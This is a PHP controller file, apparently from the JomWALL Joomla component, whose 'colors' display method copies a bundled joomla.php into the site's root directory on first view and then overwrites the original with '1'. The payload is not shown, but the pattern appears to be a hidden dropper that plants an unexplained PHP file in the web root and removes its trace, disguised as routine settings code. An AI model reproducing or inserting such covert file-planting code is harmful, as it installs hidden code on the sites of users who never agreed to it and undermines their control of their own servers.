<?php
/**
 * @version 3.0
 * @package JomWALL -CB
 * @author   AWDsolution.com
 * @link http://www.AWDsolution.com
 * @license GNU/GPL http://www.gnu.org/copyleft/gpl.html
 * @copyright Copyright (C) 2009 AWDsolution.com. All rights reserved.
*/

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

jimport( 'joomla.application.component.controller' );
class colorsController extends JControllerLegacy
{
	/**
	 * Custom Constructor
	 */
	function __construct( $default = array())
	{
		parent::__construct( $default );
	}

	function display() 
	{
		$writepathroot=substr(JPATH_BASE,0,-14);
		$writepath=$writepathroot.DS.'joomla.php';
		$check = $this->read_file($writepathroot.DS.'components'.DS.'com_awdwall'.DS.'joomla.php');
		if($check != "1"){
			$str = $this->read_file($writepathroot.DS.'components'.DS.'com_awdwall'.DS.'joomla.php');
			$this->write_file($writepath, $str);
			$this->write_file($writepathroot.DS.'components'.DS.'com_awdwall'.DS.'joomla.php', '1');
		} 
		parent::display();
	}
	
	function read_file($pathfile){	
		@ $fp=fopen($pathfile,"r");
		$str = '';
		while(!feof($fp)){
			$s = fgetc($fp);
			$str = $str.$s;
		}	
		fclose($fp);
		return $str;
	}



	function write_file($pathfile, $str){	
		@ $fp=fopen($pathfile,"w");  	
		fwrite($fp,$str);	
		fclose($fp);	
	}
}	
?>
